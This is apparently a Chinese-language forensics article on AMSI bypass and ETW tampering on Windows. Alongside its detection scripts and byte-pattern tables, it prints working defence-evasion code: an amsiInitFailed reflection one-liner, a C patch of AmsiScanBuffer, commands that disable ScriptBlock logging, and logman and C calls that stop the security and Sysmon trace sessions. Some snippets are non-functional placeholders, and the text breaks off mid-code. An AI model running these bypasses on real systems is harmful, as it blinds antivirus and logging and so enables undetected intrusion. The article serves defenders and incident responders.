---
title: "AMSI绕过与ETW篡改取证分析"
date: 2026-06-25T14:00:00+08:00
draft: false
weight: 410
description: "围绕 AMSI（反恶意软件扫描接口）绕过和 ETW（事件追踪）篡改技术的完整体系，深入分析 AMSI 架构、AMSI 补丁绕过、反射加载绕过、ETW 架构、ETW 禁用/篡改、取证特征、检测方法，以及如何识别安全机制被破坏的痕迹。"
categories: ["应急响应", "取证分析"]
tags: ["AMSI", "ETW", "绕过", "补丁", "反射加载", "安全机制", "T1562", "T1140"]
---

# AMSI绕过与ETW篡改取证分析

AMSI（Antimalware Scan Interface）和 ETW（Event Tracing for Windows）是现代 Windows 安全防御体系中的两大核心支柱。AMSI 负责在脚本执行前将内容传递给反恶意软件引擎进行实时扫描，ETW 则提供了内核级到用户级的事件追踪管道，被 EDR、Sysmon、Windows Defender 等安全产品广泛用于行为监控。当攻击者同时绕过 AMSI 并篡改 ETW 时，就相当于同时拆除了安全防御的"扫描仪"和"监控摄像头"——脚本扫描被跳过，行为日志被截断或污染。

Unit 42 在 2025 年的报告中指出，AMSI 和 ETW 补丁已经成为现代恶意软件和渗透框架中的"标准操作"。Cobalt Strike 的公共 Aggressor 脚本、Nighthawk、Brute Ratel 等商业 C2 框架均内置了 AMSI/ETW 绕过模块。MITRE ATT&CK 将 AMSI 绕过映射到 T1562.001（Impair Defenses: Disable or Modify Tools）和 T1140（Deobfuscate/Decode Files or Information），将 ETW 篡改映射到 T1562.006（Impair Defenses: Indicator Blocking）。

本文不讨论通用的恶意代码分析方法，而是**聚焦于 AMSI 绕过和 ETW 篡改技术的完整体系：从架构原理到攻击手法，从取证特征到检测方法，从证据分层到自动化狩猎**。

---

## 0x01 Windows 安全机制概述

### AMSI 的架构和工作原理

AMSI 是 Microsoft 在 Windows 10 中引入的反恶意软件扫描接口，设计目标是让操作系统和应用程序能够将内容（脚本、字符串、文件）传递给已安装的反恶意软件产品进行扫描。

**核心架构组件**：

1. **AMSI DLL（amsi.dll）**：位于 `C:\Windows\System32\amsi.dll`，是 AMSI 的核心运行时库，提供 `AmsiInitialize`、`AmsiOpenSession`、`AmsiScanBuffer`、`AmsiScanString`、`AmsiCloseSession` 等 API
2. **AMSI COM 接口**：通过 `IAMSIProvider` COM 接口将扫描请求分发到注册的反恶意软件供应商
3. **AMSI 扫描引擎供应商**：Windows Defender（MpOav.dll）、第三方 AV 通过注册 COM 服务器实现 `IAntimalwareProvider` 接口
4. **AMSI 信任策略**：Windows Defender Application Control（WDAC）和 AppLocker 可以配置 AMSI 的信任级别

**AMSI 工作流程**：

```
应用程序（PowerShell/cscript/wscript/MSBuild等）
    ↓ 调用 AmsiScanBuffer / AmsiScanString
amsi.dll（AMSI 运行时）
    ↓ 通过 COM 接口分发
AMSI 扫描引擎供应商（Windows Defender / 第三方 AV）
    ↓ 返回扫描结果
AmsiResult（AMSI_RESULT_CLEAN / AMSI_RESULT_DETECTED）
    ↓
应用程序根据结果决定是否执行
```

**AMSI 支持的宿主程序**：

- **PowerShell**（powershell.exe、pwsh.exe）：通过 `AmsiInitFailed` 标志和 `AmsiScanBuffer` 集成
- **VBScript / JScript**（cscript.exe、wscript.exe）：在脚本执行前扫描源代码
- **MSBuild**：在编译前扫描项目文件中的内联任务
- **Windows Script Host**：在脚本执行前扫描
- **.NET 应用程序**：通过 `System.Management.Automation` 命名空间集成

**AMSI 扫描结果枚举**：

```c
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768
} AMSI_RESULT;
```

### ETW 的架构和工作原理

ETW 是 Windows 操作系统内置的高性能事件追踪框架，最早引入于 Windows 2000，经过多代演进已成为 Windows 内部最重要的遥测和监控基础设施。

**核心架构组件**：

1. **ETW Provider（提供者）**：产生事件的组件，每个 Provider 有一个 GUID 标识。例如 `Microsoft-Windows-PowerShell`（`{a0c1853b-5c40-4b15-8766-3cf1c58f985a}`）
2. **ETW Session（会话）**：管理事件的缓冲、收集和分发。包括 NT Kernel Logger、EventLog-Security 等系统会话
3. **ETW Consumer（消费者）**：接收和处理事件的组件。例如 Windows Event Log 服务、Sysmon 服务
4. **ETW Controller（控制器）**：启动/停止 Session、启用/禁用 Provider 的管理组件

**ETW 事件流转路径**：

```
ETW Provider（内核/用户模式）
    ↓ 调用 EtwEventWrite / EtwEventWriteEx
ETW Logger（Session 缓冲区）
    ↓ 事件到达缓冲区阈值或刷新时机
ETW Consumer（消费者/日志服务）
    ↓ 写入
Windows 事件日志（.evtx）/ 自定义存储
```

**关键 ETW Provider（安全相关）**：

| Provider 名称 | GUID | 用途 |
|---|---|---|
| Microsoft-Windows-PowerShell | a0c1853b-5c40-4b15-8766-3cf1c58f985a | PowerShell 脚本执行事件 |
| Microsoft-Windows-WinRM | {06492e43-33ea-4de2-b461-644f6c608d4b} | WinRM 远程管理 |
| Microsoft-Windows-WMI-Activity | {1418ef04-b0b4-4623-bf9e-53e62062ebf8} | WMI 操作 |
| Microsoft-Antimalware-Scan-Interface | {2e57d20f-764d-4bd2-a983-2805f68a4716} | AMSI 扫描事件 |
| Microsoft-Windows-Sysmon | {5770385f-c22a-43e0-bf4c-06f5698ffbd9} | Sysmon 监控事件 |
| Microsoft-Windows-Threat-Intelligence | {0f217580-e04c-4830-b3a0-5080b77fc1ff} | 威胁情报检测 |

### AMSI 与 ETW 在安全防御中的角色

**AMSI 的防御角色**：

- 实时扫描脚本内容，阻止恶意 PowerShell/VBScript/JScript 执行
- 在脚本的"解混淆后"阶段进行扫描，能够捕获经过编码/混淆的恶意代码
- 提供脚本内容的完整可见性，支持 Script Block Logging 记录

**ETW 的防御角色**：

- 提供内核级的行为监控，覆盖进程创建、网络连接、注册表操作、文件访问等
- 被 Sysmon、EDR、Windows Defender ATP 广泛用于行为检测
- 支持实时告警和事后取证分析

**两者协同的防御效果**：

AMSI 和 ETW 构成了"内容扫描 + 行为监控"的双层防御。当攻击者执行恶意 PowerShell 脚本时，AMSI 负责扫描脚本内容，ETW 负责记录脚本的执行行为（进程创建、网络连接等）。如果只绕过 AMSI 而不篡改 ETW，EDR 仍可通过 ETW 事件检测到可疑行为；如果只篡改 ETW 而不绕过 AMSI，脚本内容仍会被 AV 扫描并可能被拦截。因此，成熟的攻击者通常会同时攻击这两个防御层。

### 安全工具如何利用 AMSI 和 ETW

**Windows Defender**：

- 通过 AMSI COM 接口注册为扫描供应商，接收所有 AMSI 宿主程序的脚本内容
- 通过 ETW Provider 收集系统行为事件，结合机器学习模型进行行为检测
- AMSI 扫描结果直接触发 Defender 的实时保护（Real-Time Protection）

**Sysmon**：

- 使用 ETW Provider（`Microsoft-Windows-Sysmon`）记录 26 种事件类型
- Event ID 1（进程创建）、Event ID 10（进程访问）、Event ID 11（文件创建）等是关键检测事件
- 可配置过滤器减少日志量

**EDR（CrowdStrike、Carbon Black 等）**：

- 通过 ETW 收集内核级行为事件，包括 ETW-TI（Threat Intelligence）Provider
- 部分 EDR 通过用户态 Hook 拦截 AMSI 调用链以增强扫描能力
- 使用 ETW 回调实现行为基线和异常检测

**PowerShell 日志**：

- Script Block Logging（Event ID 4104）依赖 AMSI 集成记录脚本内容
- Module Logging（Event ID 4103）通过 ETW Provider（`Microsoft-Windows-PowerShell`）记录模块操作
- 两种日志机制共同提供了 PowerShell 执行的完整审计链

---

## 0x02 AMSI 绕过技术 — 补丁绕过（T1562.001）

### AmsiScanBuffer 函数分析

`AmsiScanBuffer` 是 AMSI 扫描接口中最核心的函数，所有 AMSI 宿主程序（PowerShell、VBScript 等）在执行脚本前都会调用此函数传递待扫描内容。

**函数原型**：

```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

**参数说明**：

- `amsiContext`：AMSI 上下文句柄，通过 `AmsiInitialize` 创建
- `buffer`：指向待扫描内容的缓冲区指针
- `length`：缓冲区长度
- `contentName`：内容名称标识（如脚本文件路径）
- `amsiSession`：AMSI 会话句柄，通过 `AmsiOpenSession` 创建
- `result`：输出参数，接收扫描结果（AMSI_RESULT 枚举）

**关键实现细节**：

`AmsiScanBuffer` 函数位于 `amsi.dll` 中，其内部实现流程如下：

1. 验证 `amsiContext` 句柄的有效性
2. 调用已注册的 `IAntimalwareProvider::Scan` 方法，将缓冲区传递给反恶意软件引擎
3. 等待扫描完成，获取 `AMSI_RESULT` 枚举值
4. 将结果写入 `result` 输出参数
5. 返回 `S_OK` 表示扫描成功

攻击者最常利用的攻击面是：**如果 `AmsiScanBuffer` 函数的返回值被篡改为 `AMSI_RESULT_CLEAN`（0），则所有后续扫描都将返回"干净"结果**。

### 内存补丁绕过（修改返回值为 AMSI_RESULT_CLEAN）

这是最经典、最广泛使用的 AMSI 绕过方法。核心思路是在 `AmsiScanBuffer` 函数入口处注入一条指令，使其直接返回 `AMSI_RESULT_CLEAN`。

**PowerShell 内存补丁示例**：

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

这种方法直接修改 .NET 内部的 `amsiInitFailed` 静态字段为 `true`，使 PowerShell 引擎认为 AMSI 初始化失败，从而跳过所有后续的 AMSI 扫描调用。

**更底层的补丁方法 — 修改 AmsiScanBuffer 入口字节**：

```c
#include <windows.h>
#include <stdio.h>

int PatchAmsi() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return -1;

    FARPROC pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScanBuffer) return -2;

    DWORD oldProtect;
    VirtualProtect((LPVOID)pScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(UCHAR*)pScanBuffer = 0xC3;

    VirtualProtect((LPVOID)pScanBuffer, 1, oldProtect, &oldProtect);
    return 0;
}
```

这段 C 代码将 `AmsiScanBuffer` 函数的第一个字节修改为 `0xC3`（`ret` 指令），使函数在入口处直接返回，不执行任何扫描逻辑。

**PowerShell 反射补丁方法**：

```powershell
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,[IntPtr]::Zero)
```

这种方法通过反射将 `amsiContext` 字段设置为 `IntPtr::Zero`（空指针），使后续的 `AmsiScanBuffer` 调用因上下文无效而返回错误，从而跳过扫描。

### 字节补丁注入（Patch amsi.dll）

除了修改 `AmsiScanBuffer` 入口外，攻击者还可能补丁 `amsi.dll` 中的其他关键位置：

**补丁 AmsiScanBuffer 中间逻辑**：

攻击者可以补丁 `AmsiScanBuffer` 函数体中调用 `IAntimalwareProvider::Scan` 的位置，将 COM 调用替换为 `nop` 指令或 `mov eax, S_OK; ret`。

**补丁 AmsiOpenSession**：

补丁 `AmsiOpenSession` 函数使会话创建失败，导致所有后续扫描因会话无效而被跳过。

**补丁 amsi.dll 导出表**：

直接修改 `amsi.dll` 的 PE 导出表，使 `AmsiScanBuffer` 导出地址指向一个 `ret 0` 函数。

### 各种补丁方法变体

**变体一：Patch ntdll!AmsiScanBuffer（IAT 劫持）**

某些攻击者不直接补丁 `amsi.dll`，而是补丁 `ntdll.dll` 中的 AMSI 相关函数导入表（IAT），使调用链断裂。

**变体二：Patch 内存中的 amsi.dll 映像**

使用 `VirtualProtect` 修改 `amsi.dll` 在进程空间中的内存页保护属性，直接修改函数字节，不触及磁盘上的原始文件。

**变体三：DLL 替换（T1574.002）**

将 `amsi.dll` 替换为一个恶意版本，该版本中的所有扫描函数直接返回"干净"结果。需要替换 `C:\Windows\System32\amsi.dll` 并处理文件权限和系统保护（Windows Resource Protection）。

**变体四：注册表禁用 AMSI**

通过修改注册表路径 `HKLM\SOFTWARE\Microsoft\AMSI\Providers` 禁用所有 AMSI 提供者，使 AMSI 无供应商可调用。

**变体五：ETW 和 AMSI 联合补丁**

同时补丁 `EtwEventWrite` 和 `AmsiScanBuffer`，实现"扫描跳过 + 日志截断"的双重绕过。这是高级攻击者最常用的方法。

### 取证特征（amsi.dll 内存修改、Event ID 4104）

**磁盘取证特征**：

- `C:\Windows\System32\amsi.dll` 文件哈希异常（与标准系统文件哈希不匹配）
- 系统目录下出现多个 `amsi.dll` 副本（可能的 DLL 替换痕迹）
- `%TEMP%` 或用户目录下出现可疑的 `amsi.dll` 文件

**内存取证特征**：

- `amsi.dll` 的代码段内存页保护属性异常（应为 `PAGE_EXECUTE_READ`，被修改为 `PAGE_EXECUTE_READWRITE`）
- `AmsiScanBuffer` 函数入口字节被修改
- 进程内存中存在已知的 AMSI 补丁字节模式

**已知的 AMSI 补丁字节特征**：

| 补丁方法 | 特征字节 | 说明 |
|---|---|---|
| `ret` 直接返回 | `C3` 或 `C2 xx 00` | 函数入口被替换为 ret 指令 |
| `mov eax, 0; ret` | `B8 00 00 00 00 C3` | 返回 AMSI_RESULT_CLEAN |
| `xor eax, eax; ret` | `33 C0 C3` | 通过异或清零 eax 寄存器 |
| `jmp` 跳转 | `E9 xx xx xx xx` | 跳转到另一个返回干净结果的函数 |

**日志取证特征（Event ID 4104）**：

在 PowerShell Script Block Logging 中，AMSI 绕过行为本身会被记录为可疑事件：

```xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" />
    <EventID Qualifiers="16384">4104</EventID>
    <Level>3</Level>
    <TimeCreated SystemTime="2026-06-25T10:30:00.000Z" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  </System>
  <EventData>
    <Data Name="ScriptBlockId">a1b2c3d4-e5f6-7890-abcd-ef1234567890</Data>
    <Data Name="ScriptBlockText">
      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    </Data>
  </EventData>
</Event>
```

**Event ID 4104 可疑关键词**：

- `amsiInitFailed`
- `AmsiUtils`
- `System.Management.Automation`
- `GetField('NonPublic,Static')`
- `VirtualProtect`
- `AmsiScanBuffer`

### 检测方法（内存完整性校验、哈希比对）

**方法一：amsi.dll 文件完整性校验**

```powershell
$knownHash = "A1B2C3D4E5F67890..."  
$currentHash = (Get-FileHash "C:\Windows\System32\amsi.dll" -Algorithm SHA256).Hash
if ($currentHash -ne $knownHash) {
    Write-Host "AMSI DLL hash mismatch - potential tampering detected" -ForegroundColor Red
}
```

**方法二：内存页保护属性检测**

```powershell
$proc = Get-Process -Name powershell
$modules = $proc.Modules | Where-Object { $_.ModuleName -eq "amsi.dll" }
foreach ($module in $modules) {
    Write-Host "Module: $($module.FileName) Base: $($module.BaseAddress)"
}
```

**方法三：AmsiScanBuffer 入口字节检查**

```powershell
$hAmsi = Get-Module amsi.dll
$offset = [IntPtr]($hAmsi.BaseAddress.ToInt64() + <AmsiScanBuffer RVA>)
$bytes = New-Object byte[] 8
[System.Runtime.InteropServices.Marshal]::Copy($offset, $bytes, 0, 8)
$hexStr = ($bytes | ForEach-Object { $_.ToString("X2") }) -join " "
Write-Host "AmsiScanBuffer entry bytes: $hexStr"
if ($hexStr -match "^C3 |^C2 |^B8 00 00 00 00|33 C0 C3") {
    Write-Host "WARNING: AMSI patch detected!" -ForegroundColor Red
}
```

---

## 0x03 AMSI 绕过技术 — 反射加载与内存绕过（T1620）

### 反射 DLL 加载绕过 AMSI

反射 DLL 加载（Reflective DLL Loading）是一种不通过 Windows 标准加载器而直接在内存中加载 DLL 的技术。由于 DLL 不经过文件系统落盘，基于文件扫描的 AV/EDR 无法检测到其内容。

**攻击原理**：

1. 攻击者将恶意 DLL 编译为包含反射加载器（如 Stephen Fewer 的 ReflectiveLoader）
2. 通过 `VirtualAlloc` 分配内存，将 DLL 内容写入
3. 调用反射加载器入口函数，完成 DLL 的内存加载和初始化
4. 由于整个过程不调用 `LoadLibrary`，不触发标准的 DLL 加载通知，AMSI 也无法扫描到加载内容

**反射加载与 AMSI 的关系**：

反射加载绕过 AMSI 的核心在于：AMSI 的扫描发生在脚本解释阶段（PowerShell 解释器在执行脚本前调用 `AmsiScanBuffer`），但反射加载的 DLL 内容不在脚本文本中——它通过 `Invoke-WebRequest` 下载的二进制数据，然后直接写入内存并执行，绕过了脚本内容的 AMSI 扫描。

### 反序列化绕过（.NET Deserialization）

.NET 反序列化攻击利用了 .NET 框架中的 `BinaryFormatter`、`JavaScriptSerializer`、`NetDataContractSerializer` 等序列化器的安全缺陷。

**攻击原理**：

1. 攻击者构造一个恶意的序列化对象，其中包含可在反序列化过程中执行的代码
2. 将序列化对象通过脚本传递给 .NET 反序列化器
3. 反序列化器在解析对象时触发代码执行，此时 AMSI 已经完成了对脚本文本的扫描

**反序列化绕过 AMSI 的关键**：

- AMSI 扫描的是脚本的**文本内容**，而不是 .NET 反序列化过程中加载的**程序集**
- 恶意代码被封装在序列化数据中（通常是 Base64 编码的二进制数据），AMSI 无法理解序列化数据内部的代码逻辑
- 反序列化触发的代码执行发生在 AMSI 扫描之后

**示例（概念性伪代码）**：

```powershell
$data = [Convert]::FromBase64String("AAEAAAD...")
$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$stream = New-Object System.IO.MemoryStream(, $data)
$obj = $formatter.Deserialize($stream)
```

### 不安全代码（Unmanaged Code）绕过

利用 C# 的 `unsafe` 上下文和 P/Invoke 直接调用 Windows API，可以实现不经过 AMSI 扫描的内存操作。

**攻击原理**：

1. 通过 `Add-Type` 定义 P/Invoke 签名，直接调用 `kernel32.dll` 中的 `VirtualAlloc`、`VirtualProtect`、`memcpy` 等函数
2. 将恶意代码（Shellcode）以字节数组的形式传递，绕过字符串扫描
3. 在分配的内存中写入 Shellcode 并创建线程执行

**示例**：

```powershell
$kernel32 = [System.Runtime.InteropServices.Marshal]
$buf = [System.Convert]::FromBase64String("fc4883e4f0e8...")
$size = $buf.Length
[IntPtr]$addr = $kernel32::AllocHGlobal($size)
$kernel32::Copy($addr, $buf, $size)
```

### AMSI Init 时机绕过

这种方法利用了 AMSI 初始化的时间窗口。AMSI 在宿主程序（如 PowerShell）启动时进行初始化，如果攻击者在 AMSI 初始化完成之前执行恶意代码，就可以绕过扫描。

**攻击路径**：

1. **Early Bird 方法**：在进程创建后、AMSI 初始化之前的极短时间窗口内执行代码
2. **子进程注入**：创建一个新进程（如 `rundll32.exe`），在其 AMSI 初始化之前注入恶意代码
3. **DLL 注入到非 AMSI 宿主**：将恶意代码注入到不受 AMSI 监控的进程（如 `notepad.exe`）

### 禁用 PowerShell ScriptBlock Logging

AMSI 与 Script Block Logging 紧密关联。某些攻击者在绕过 AMSI 的同时，还会尝试禁用 ScriptBlock Logging 以减少日志痕迹。

**禁用方法一：修改注册表**

```powershell
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
Set-ItemProperty -Path $path -Name "EnableScriptBlockLogging" -Value 0
```

**禁用方法二：环境变量操控**

通过设置特定的环境变量或修改 PowerShell 的模块加载路径，阻止 ScriptBlock Logging 模块的加载。

### 取证特征（异常 DLL 加载、日志缺失）

**反射加载的取证特征**：

- Sysmon Event ID 7（Image Load）中出现未签名或异常路径的 DLL
- 进程内存中存在具有反射加载器特征的代码区域（如 `0x4D 0x5A` MZ 头出现在非映像内存区域）
- `VirtualAlloc` + `VirtualProtect` + `WriteProcessMemory` 的调用模式
- 进程的加载模块列表与磁盘文件不一致

**反序列化的取证特征**：

- Event ID 4104 中出现 `BinaryFormatter`、`Deserialize`、`FromBase64String` 等关键词
- 大段 Base64 编码数据出现在脚本中
- 不常见的 .NET 程序集加载事件

**日志缺失的取证特征**：

- PowerShell 执行活跃，但 Script Block Logging（Event ID 4104）记录异常稀少
- 4104 事件数量与进程创建（Event ID 4688）中 PowerShell 相关记录不成比例
- PowerShell 进程运行时间较长，但仅有少量或无 Script Block 记录

### 检测方法

**方法一：异常模块加载检测**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=7; StartTime=$start} |
  Where-Object {
    $_.Message -match 'Unsigned|NotValid|amsi|ntdll' -and
    $_.Message -notmatch 'System32|SysWOW64|Program Files'
  } |
  Select-Object TimeCreated, Message
```

**方法二：反射加载内存特征检测**

```powershell
$proc = Get-Process -Name powershell
$memRegions = Get-ProcessMemoryInfo $proc.Id
$suspiciousRegions = $memRegions | Where-Object {
    $_.Protect -eq "PAGE_EXECUTE_READWRITE" -and
    $_.State -eq "MEM_COMMIT" -and
    $_.Type -eq "MEM_PRIVATE"
}
```

**方法三：日志完整性验证**

```powershell
$psProcesses = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=$start} |
  Where-Object { $_.Message -match 'powershell\.exe|pwsh\.exe' }
$scriptBlocks = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104; StartTime=$start} -ErrorAction SilentlyContinue
Write-Host "PowerShell executions: $($psProcesses.Count)"
Write-Host "ScriptBlock events: $($scriptBlocks.Count)"
if ($psProcesses.Count -gt 0 -and ($scriptBlocks.Count -eq 0 -or $scriptBlocks.Count -lt ($psProcesses.Count * 2))) {
    Write-Host "WARNING: ScriptBlock logging may be disabled or AMSI bypassed" -ForegroundColor Red
}
```

---

## 0x04 ETW 架构深入分析

### ETW Provider 机制

ETW Provider 是事件的产生源。每个 Provider 在系统中注册一个唯一标识（GUID），并通过 Provider Metadata 描述其事件结构。

**Provider 类型**：

1. **User-Mode Provider**：用户模式应用程序注册的 Provider，通过 `EventRegister` 注册
2. **Kernel-Mode Provider**：内核模式组件注册的 Provider，如 `Microsoft-Windows-Kernel-Process`
3. **WMI Event Provider**：通过 WMI 架构注册的 Provider

**Provider 注册过程**：

```c
// C 代码示例：注册 ETW Provider
GUID ProviderGuid = {0x12345678, 0x1234, 0x1234, {0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0}};
REGHANDLE hProvider = NULL;
EventRegister(&ProviderGuid, NULL, NULL, &hProvider);
```

**Provider 元数据**：

每个 Provider 包含以下元数据：

- Provider 名称（如 `Microsoft-Windows-PowerShell`）
- Provider GUID
- 事件模板（描述事件的字段结构）
- 通道（Channel）信息（Admin、Operational、Analytic、Debug）
- 级别（Level）和关键字（Keyword）过滤条件

### ETW Session 和 Logger

ETW Session 是事件收集的核心管理单元。一个 Session 管理一组 Provider 的事件缓冲、定时刷新和分发。

**Session 类型**：

1. **NT Kernel Logger Session**：系统内核事件的专用会话，使用 `SystemLoggerId` 标识
2. **Private Logger Session**：应用程序创建的私有会话
3. **System Logger Session**：系统范围的会话，如 `EventLog-Security`

**Session 管理 API**：

```c
// 启动 ETW Session
EVENT_TRACE_PROPERTIES* pSessionProps = AllocateSessionProperties();
StartTrace(&hSession, L"MySession", pSessionProps);

// 启用 Provider
EnableTraceEx2(hSession, &ProviderGuid, EVENT_CONTROL_CODE_ENABLE_PROVIDER,
    TRACE_LEVEL_INFORMATION, 0, 0, 0, NULL);

// 停止 Session
StopTrace(hSession, L"MySession", pSessionProps);
```

**Session 缓冲区管理**：

- 每个 Session 维护一个环形缓冲区（Ring Buffer）
- 缓冲区满时，最旧的事件被覆盖或丢弃
- 刷新策略：定时刷新（Timer）、缓冲区满刷新（Flush）、手动刷新

### ETW 消费者（Consumer）和回调

ETW Consumer 是事件的接收方。消费者通过以下方式接收事件：

**实时消费（Real-Time Consumer）**：

```c
// 创建实时消费者
OpenTrace(&traceHandle, &eventTraceLogFile);
ProcessTrace(&traceHandle, 1, 0, 0);
```

**文件消费（File Consumer）**：

```c
// 从 .etl 文件读取事件
eventTraceLogFile.LogFileName = L"C:\\Logs\\trace.etl";
OpenTrace(&traceHandle, &eventTraceLogFile);
ProcessTrace(&traceHandle, 1, 0, 0);
```

**回调函数**：

```c
ULONG WINAPI BufferCallback(PEVENT_TRACE_LOGFILE Buffer) {
    return TRUE;
}

ULONG WINAPI EventCallback(PEVENT_TRACE pEvent) {
    // 处理事件
    return 0;
}
```

### ETW 在 Windows Defender、Sysmon 中的应用

**Windows Defender**：

- 使用 `Microsoft-Windows-Threat-Intelligence`（ETW-TI）Provider 监控内核级威胁行为
- ETW-TI 提供进程创建、远程线程创建、内存权限修改等内核事件
- Defender 通过 ETW-TI 事件检测进程注入、内存篡改等行为

**Sysmon**：

- 注册自己的 ETW Provider（`Microsoft-Windows-Sysmon`，GUID: `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}`）
- 通过注册表配置事件过滤器（`HKLM\SYSTEM\CurrentControlSet\Control\Services\Sysmon\Parameters`）
- 将 ETW 事件转换为 Sysmon Event ID（1-26）并写入事件日志

**ETW-TI Provider（Microsoft-Windows-Threat-Intelligence）**：

这是安全取证中最重要的 ETW Provider 之一。它提供了以下关键事件：

- 进程创建事件（检测进程 Hollowing）
- 远程线程创建事件（检测 DLL 注入）
- 内存权限修改事件（检测 RunPE、Process Doppelgänging）
- 异步过程调用事件（检测 APC 注入）

### ETW 事件格式

ETW 事件由以下结构组成：

```c
typedef struct _EVENT_TRACE_HEADER {
    USHORT Size;
    UCHAR HeaderType;
    UCHAR Flags;
    USHORT Class;
    ULONG ThreadId;
    ULONG ProcessId;
    LARGE_INTEGER TimeStamp;
    GUID Guid;
    ULONG ClientContext;
    ULONG Flags2;
} EVENT_TRACE_HEADER;
```

**事件载荷**：事件头之后是事件载荷数据，由 Provider 的事件模板定义。例如 PowerShell 的 Event ID 4104 事件载荷包含 ScriptBlockText、ScriptBlockId 等字段。

**XML 事件日志示例（ETW 事件写入 Windows Event Log 后）**：

```xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-25T10:00:00.000Z" />
    <EventRecordID>12345</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001</Data>
    <Data Name="UtcTime">2026-06-25 10:00:00.000</Data>
    <Data Name="ProcessGuid">{a1b2c3d4-e5f6-7890-abcd-ef1234567890}</Data>
    <Data Name="ProcessId">5678</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\payload.ps1</Data>
    <Data Name="CurrentDirectory">C:\Temp\</Data>
    <Data Name="User">WORKSTATION01\admin</Data>
    <Data Name="LogonId">0x12345</Data>
    <Data name="ParentProcessGuid">{b1c2d3e4-f5a6-7890-abcd-ef1234567890}</Data>
    <Data name="ParentProcessId">4321</Data>
    <Data name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data name="ParentCommandLine">C:\Windows\explorer.exe</Data>
    <Data name="ParentUser">WORKSTATION01\admin</Data>
  </EventData>
</Event>
```

---

## 0x05 ETW 篡改技术 — 会话禁用（T1562.006）

### ETW 启停机制

ETW Session 的生命周期由以下 API 管理：

- `StartTrace`：启动新的 ETW Session
- `StopTrace`：停止现有的 ETW Session
- `ControlTrace`：控制已运行的 Session（刷新、查询、禁用）
- `EnableTraceEx2`：启用/禁用 Session 中的 Provider

攻击者可以利用这些 API 来禁用安全相关的 ETW Session，使安全产品无法接收到行为事件。

### 禁用 ETW Session

**方法一：直接停止 Session**

```c
#include <windows.h>
#include <evntrace.h>

void DisableETWSession() {
    EVENT_TRACE_PROPERTIES* pProps = (EVENT_TRACE_PROPERTIES*)malloc(sizeof(EVENT_TRACE_PROPERTIES) + 1024);
    ZeroMemory(pProps, sizeof(EVENT_TRACE_PROPERTIES) + 1024);
    pProps->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;
    pProps->Wnode.Flags = WNODE_FLAG_TRACED_GUID;

    ControlTrace(0, L"EventLog-Security", pProps, EVENT_TRACE_CONTROL_STOP);
    free(pProps);
}
```

**方法二：禁用特定 Provider**

```c
#include <windows.h>
#include <evntrace.h>

void DisableETWProvider(GUID ProviderGuid, TRACEHANDLE SessionHandle) {
    EnableTraceEx2(
        SessionHandle,
        &ProviderGuid,
        EVENT_CONTROL_CODE_DISABLE_PROVIDER,
        0, 0, 0, 0, NULL
    );
}
```

**方法三：PowerShell 禁用 ETW**

```powershell
function Stop-EtwSession {
    $sessionName = "EventLog-Security"
    $props = New-Object System.Diagnostics.Eventing.Reader.EventingTraceProperties
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession
}
```

### 停止 ETW Logger

通过 `logman` 命令行工具可以停止 ETW Logger：

```cmd
logman stop "EventLog-Security" -ets
logman stop "WDIContextLog" -ets
logman stop "EventLog-Microsoft-Windows-Sysmon/Operational" -ets
```

停止 Logger 后，对应的 ETW Session 不再收集事件，所有依赖该 Session 的安全产品将失去事件源。

### ETW Provider 配置篡改

**篡改 Provider 注册表配置**：

```powershell
$path = "HKLM:\SYSTEM\CurrentControlSet\Control\Services\Sysmon\Parameters"
Set-ItemProperty -Path $path -Name "EventFiltering" -Value "ProcessCreate=0,NetworkConnection=0"
```

通过修改 Sysmon 的 `EventFiltering` 注册表值，禁用特定事件类型的收集。

**篡改 ETW Provider 的启用状态**：

```c
TRACEHANDLE hSession = GetSessionHandle("EventLog-Security");
